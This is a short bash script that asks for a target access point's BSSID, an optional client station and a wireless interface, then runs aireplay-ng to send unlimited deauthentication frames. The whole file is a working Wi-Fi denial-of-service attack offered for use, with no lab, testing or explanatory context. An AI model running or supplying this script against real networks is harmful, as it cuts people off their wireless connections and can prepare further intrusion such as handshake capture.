#!/usr/bin/bash

printf "Whats the target bssid?: "
read bssid
printf "Do you want to deauth a specific device (leave blank if no if yes then put the device station): "
read station
printf "Whats the interface?: "
read interface

if [ "$station" == "" ]; then
        sudo aireplay-ng --ignore-negative-one --deauth 0 -a $bssid $interface
else
        sudo aireplay-ng --ignore-negative-one --deauth 0 -a $bssid -c $station $interface
fi